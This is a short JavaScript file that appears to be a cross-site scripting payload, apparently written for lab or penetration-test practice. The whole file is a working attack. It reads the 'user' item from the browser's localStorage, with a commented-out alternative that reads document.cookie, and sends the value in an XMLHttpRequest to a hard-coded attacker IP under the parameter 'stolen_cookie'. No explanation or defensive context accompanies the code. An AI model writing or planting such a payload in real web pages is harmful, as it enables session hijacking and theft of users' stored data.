var attacker_ip = "192.168.119.176";
var url = "http://"+attacker_ip+"?stolen_cookie=";

//Steal cookie
query_string = localStorage.getItem("user");
//query_string = document.cookie

function make_request(url){
    xhr = new XMLHttpRequest();
    xhr.open("GET", url + query_string, true);
    xhr.send(null);
}

make_request(url);
